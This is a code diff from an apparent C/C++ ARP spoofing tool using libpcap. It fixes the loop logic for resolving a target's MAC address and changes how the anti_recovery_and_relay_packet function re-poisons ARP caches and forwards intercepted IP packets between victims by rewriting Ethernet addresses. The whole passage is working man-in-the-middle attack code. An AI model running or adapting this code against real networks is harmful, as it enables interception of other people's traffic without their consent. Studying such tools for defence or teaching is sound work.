@@ -160,9 +160,11 @@ void get_target_mac(uint8_t *output_target_mac,char *target_ip,pcap_t *fp){
             arph = (struct _arp_hdr*)pkt_data;
             u32target_ip = arph->sender_ip;
             if(u32input_ip == u32target_ip)
-            memcpy(output_target_mac,eh->Src_mac,6);
+            {
+                memcpy(output_target_mac,eh->Src_mac,6);
+                break;
+            }
         }
-        break;
     }
 }
 void anti_recovery_and_relay_packet(char *snd_ip,uint8_t *snd_mac,char *trg_ip, uint8_t *trg_mac,char *atk_ip,uint8_t *rcv_mac,pcap_t *fp)
@@ -188,25 +190,26 @@ void anti_recovery_and_relay_packet(char *snd_ip,uint8_t *snd_mac,char *trg_ip, 
             etype = ntohs(eh->ether_type);
             iph = (struct iphdr*)(pkt_data+sizeof(struct _ether_hdr));
             if(etype == ETHERTYPE_ARP)
-            {
+            {//infection  check
                 cout<<"Detected ARP Packet!"<<endl;
                 arp_infection(snd_ip,snd_mac,trg_ip,trg_mac,1,fp);
             }
             if(etype == ETHERTYPE_IP)
             {
-                if(strcmp((char*)snd_mac,(char*)eh->Dst_mac)==0)
+                //if(memcmp(snd_mac,eh->Dst_mac,6)==0)
+                if(memcmp(trg_mac,eh->Src_mac,6)==0)
                 {
-                    if(u32_atk_ip != iph->saddr)
-                    {
+                    //if(u32_atk_ip != iph->saddr)
+                    //{
                         memcpy(eh->Dst_mac,rcv_mac,6);
                         memcpy(eh->Src_mac,snd_mac,6);
                         if(pcap_sendpacket(fp,pkt_data,(sizeof(struct _ether_hdr)+htons(iph->tot_len)))!=0)
-                        {
+                        {//use pkt_header length
                             fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(fp));
                         }
                         break;
                     }
-                }
+                //}
             }
         }
     }
